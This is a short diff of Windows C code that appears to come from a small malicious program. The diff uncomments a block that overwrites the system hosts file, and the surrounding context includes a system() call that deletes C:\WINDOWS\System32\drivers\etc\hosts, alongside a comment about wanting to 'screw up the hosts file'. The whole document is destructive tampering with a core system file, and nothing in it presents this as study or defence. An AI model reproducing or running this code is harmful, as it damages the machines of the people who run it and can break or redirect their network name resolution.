@@ -31,7 +31,6 @@ ExitProcess(0);
 return 0;
 }
 
-/*overwrite localhost file
 {
 char host[MAX_PATH];
 GetSystemDirectory(host, sizeof(host));
@@ -74,7 +73,6 @@ HANDLE hFile = CreateFile(host, GENERIC_WRITE, 0, 0, CREATE_ALWAYS, FILE_ATTRIBU
 BOOL bSuccess = WriteFile ( hFile, buffer, strlen(buffer), &byte, NULL);
 CloseHandle(hFile);
 }
-*/
 
 //let's screw up the hosts file sense idk how to overwrite it.
 system("del C:\WINDOWS\System32\drivers\etc\hosts");
